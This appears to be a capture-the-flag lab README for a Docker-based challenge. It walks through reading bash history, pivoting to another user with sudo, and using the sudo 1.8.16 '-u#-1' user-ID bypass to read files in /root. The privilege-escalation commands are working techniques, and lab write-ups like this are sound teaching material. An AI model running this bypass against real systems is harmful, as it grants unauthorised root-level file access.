# Sudo - Integer Overflow

## Setup

1. Build the docker image
```bash
$ make build
```
2. Bind port & run docker image
```bash
$ make run
0.0.0.0:[PORT]
```
3. Log in to account 'user', password 'ctf'
`$ ssh user@localhost -p [PORT]`

## Solution

1. Looking through bash history, notices sudo permissions were probably changed with 'visudo'

```bash
# use history command
$ history
1. cd /etc/
2. visudo
3. ls -l .
4. exit
# or just print the contents
$ cat .bash_history
```

2. Check to see sudo permissions

```bash
$ sudo -l
User user may run the following commands on ...:
    (alice) ALL
```

3. Many things can be done at this point, easiest may be to just run bash
```bash
$ sudo -u alice /bin/bash
alice@...:~$
```

4. Running sudo -l again, notice strange permissions
```bash
$ sudo -l
User alice may run the following commands on ...:
    (ALL, !root) NOPASSWD: /bin/cat, /bin/ls
```

5. Looking at sudo version, we will notice the outdated version
```bash
$ sudo --version
Sudo version 1.8.16
Sudoers policy plugin version 1.8.16
Sudoers file grammar version 45
Sudoers I/O plugin version 1.8.16
```

6. This outdated version can be exploited for integer overflow. Use it to look at /root directory
```bash
$ sudo -u#-1 ls /root
flag
```
7. Read the flag!
```bash
$ sudo -u#-1 cat /root/flag
```
